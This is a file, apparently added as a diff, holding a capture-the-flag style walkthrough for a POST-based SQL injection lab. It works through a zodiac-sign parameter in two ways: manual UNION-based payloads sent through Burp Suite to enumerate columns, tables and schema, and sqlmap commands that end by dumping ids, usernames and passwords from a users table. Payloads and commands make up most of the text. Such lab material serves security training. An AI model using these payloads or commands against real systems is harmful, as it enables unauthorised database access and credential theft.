@@ -1,0 +1,58 @@
+-> POST Based SQL Injection Variant 3
+
+Query:
+	Solution by manual approach:
+	Step 1: Go to the URL to access the lab (The URL may be different for each user). http://13.233.238.136/SQL-Injection/Post-Based-SQL-Injection-Variant-3/
+	
+	Step 2: Now enter the given credentials (Username: test2@test.com; Password: pass) to login.
+	
+	Step 3: Now open Burp Suite, and turn on the intercept.
+	
+	Step 4: Now choose any zodiac sign and click on ‘show me’ icon to intercept the request, and send this request to repeater (ctrl+r)
+	
+	Step 5: The request will look like this:
+	sign=Pisces
+
+	Step 6: Now add sign=Pisces' order by 3--+ and click on Go.
+	Right click under ‘Response’ section and choose ‘show response in browser’ option to view the response.
+	
+	Step 7: Now to find vulnerable columns enter this query:
+	sign=Pisces' union select 1,2,3--+
+	it will give vulnerable column number 3 and this is our injection point.
+	
+	Step 8: Now to find tables enter this query and click on Go, then again click on ‘show response in browser’.
+	sign=Pisces' union select 1,2,group_concat(table_name) from information_schema.table_constraints--+
+	
+	Step 9: Now use this query to find columns:
+	sign=Pisces' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='name of the table'--+
+	Then click on Go to forward the request.
+	Then right click on ‘response’ section and choose ‘Show response in browser’ to view the response in the browser.
+
+SQLMAP:
+Solution using SQLmap:
+	Step 1: Go to the URL to access the lab (The URL may be different for each user). http://13.233.238.136/SQL-Injection/Post-Based-SQL-Injection-Variant-3/
+	
+	Step 2: Now enter the given credentials (Username: test2@test.com; Password: pass) to login. Now open Burp Suite and turn the intercept ON.
+	
+	Step 3: Now choose any zodiac sign from the browser and click on the ‘show me’ icon to intercept the request, and send this request to repeater(ctrl+r)
+	
+	Step 4: Add * to the query like this:
+	sign=Pisces*
+	
+	Step 5: Now copy the request and save it in the SQLmap directory by the name anyname.txt
+	
+	Step 6: Open SQLmap in the terminal or command prompt.
+	
+	Step 7: Now enter this command:
+	sqlmap -r filename.txt --dbs
+	
+	Step 8: It will ask you several questions with options to choose from, so choose accordingly and learn about sqlmap.
+	
+	Step 9: Enter this command to find tables:
+	sqlmap -r checksql.txt -D SQL_Injection_V7 --tables
+	
+	Step 10: To fetch columns enter this command:
+	sqlmap -r checksql.txt -D SQL_Injection_V7 -T users --columns
+	
+	Step 11: Now to fetch data, enter this command:
+	sqlmap -r checksql.txt -D SQL_Injection_V7 -T users -C id,password,username --dump
